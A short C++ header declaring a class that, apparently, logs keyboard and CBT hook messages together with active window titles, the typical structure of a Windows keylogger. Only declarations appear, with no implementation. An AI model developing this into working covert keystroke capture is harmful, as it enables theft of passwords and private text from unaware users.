#pragma once

#include "Logger.h"

class CProcessing
{
private:
	CLogger* m_Logger;
	HWND m_LastWriteHWND, m_CurrentHWND;
	PWSTR m_Title, m_BackupTitle, m_LastWriteTitle, m_KeyNameBuffer;
	BOOL m_NeedWriteTitle;
public:
	CProcessing();
	~CProcessing();
private:
	BOOL GetTitle(HWND hWnd, PWSTR Title, PWSTR BackupTitle);
	BOOL WriteTitle(void);
public:
	void SaveKeyboadMsg(WPARAM wParam, LPARAM lParam);
	void SaveCBTMsg(WPARAM wParam, LPARAM lParam);
};
